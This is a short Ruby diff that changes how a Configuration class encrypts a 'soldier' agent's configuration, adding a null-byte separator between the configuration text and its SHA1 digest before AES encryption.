@@ -28,7 +28,7 @@ class Configuration
 
   def encrypted_soldier_config(confkey)
     # encrypt the config for the agent using the confkey
-    aes_encrypt(self.soldier_config.force_encoding('ASCII-8BIT') + Digest::SHA1.digest(self.soldier_config), Digest::MD5.digest(confkey))
+    aes_encrypt(self.soldier_config.force_encoding('ASCII-8BIT') + "\x00" + Digest::SHA1.digest(self.soldier_config), Digest::MD5.digest(confkey))
   end
 
   def soldier_config
